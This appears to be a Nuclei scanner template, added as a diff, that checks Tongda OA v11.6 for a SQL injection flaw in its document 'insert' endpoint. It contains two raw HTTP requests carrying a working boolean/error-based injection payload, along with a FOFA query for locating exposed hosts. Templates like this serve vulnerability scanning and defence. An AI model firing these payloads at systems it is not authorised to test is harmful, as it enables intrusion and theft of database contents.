@@ -1,0 +1,47 @@
+id: tongda-insert-sqli
+
+info:
+  name: Tongda OA v11.6 Insert Parameter - SQL Injection
+  author: SleepingBag945
+  severity: high
+  description: |
+    Tongda OA v11.6 insert parameters contain SQL injection vulnerabilities, through which attackers can obtain sensitive database information
+  reference:
+    - https://github.com/PeiQi0/PeiQi-WIKI-Book/blob/main/docs/wiki/oa/%E9%80%9A%E8%BE%BEOA/%E9%80%9A%E8%BE%BEOA%20v11.6%20insert%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md
+  metadata:
+    verified: true
+    max-request: 2
+    fofa-query: app="TDXK-通达OA"
+  tags: tongda,sqli,intrusive
+
+http:
+  - raw:
+      - |
+        POST /general/document/index.php/recv/register/insert HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        title)values("'"^exp(if(ascii(substr(MOD(5,2),1,1))<128,1,710)))# =1&_SERVER=
+      - |
+        POST /general/document/index.php/recv/register/insert HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        title)values("'"^exp(if(ascii(substr(MOD(5,2),1,1))>128,1,710)))# =1&_SERVER=
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: header_1
+        words:
+          - "PHPSESSID="
+          - "register_for/?rid="
+        condition: and
+
+      - type: word
+        part: header_2
+        words:
+          - "register_for/?rid="
+        negative: true
+
+# digest: 4b0a004830460221009ed8e040f9c911e7b4528b68de3d737caf0324411add23a0bf7b5f4313090f09022100c70aafde7c380998799b974261723a1c4a1247cdbb59b5dd156e249be7af06ee:922c64590222798bb761d5b6d8e72950
